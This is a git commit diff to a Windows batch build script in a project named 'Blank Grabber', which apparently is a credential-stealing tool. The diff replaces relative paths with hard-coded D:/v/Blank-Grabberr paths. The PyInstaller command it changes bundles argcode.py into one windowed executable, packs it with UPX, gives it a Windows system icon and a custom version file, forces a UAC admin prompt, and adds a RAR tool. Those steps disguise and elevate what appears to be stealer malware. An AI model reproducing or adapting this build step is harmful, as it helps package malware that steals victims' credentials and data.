55c10543014bb1217c449fc1896c12fb9cb76864
43a1723 <hai1723notgay@gmail.com>
2024-06-17 19:58:32 +0700

    Update buildmy.bat

--- build/buildmy.bat
+++ build/buildmy.bat
@@ -1,3 +1,2 @@
 @echo off
-cd ..
-pyinstaller --noconfirm --onefile --windowed --icon "%cd%/build/imageres_15.ico" --upx-dir "%cd%/UPX" --version-file "%cd%/Blank Grabber/Components/version.txt" --uac-admin --add-data "%cd%/Blank Grabber/Components/rar.exe;." --add-data "%cd%/Blank Grabber/Components/rarreg.key;."  "%cd%/argcode.py"
+pyinstaller --noconfirm --onefile --windowed --icon "D:/v/Blank-Grabberr/build/imageres_15.ico" --upx-dir "D:/v/Blank-Grabberr/UPX" --version-file "D:/v/Blank-Grabberr/Blank Grabber/Components/version.txt" --uac-admin --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rar.exe;." --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rarreg.key;."  "D:/v/Blank-Grabberr/argcode.py"
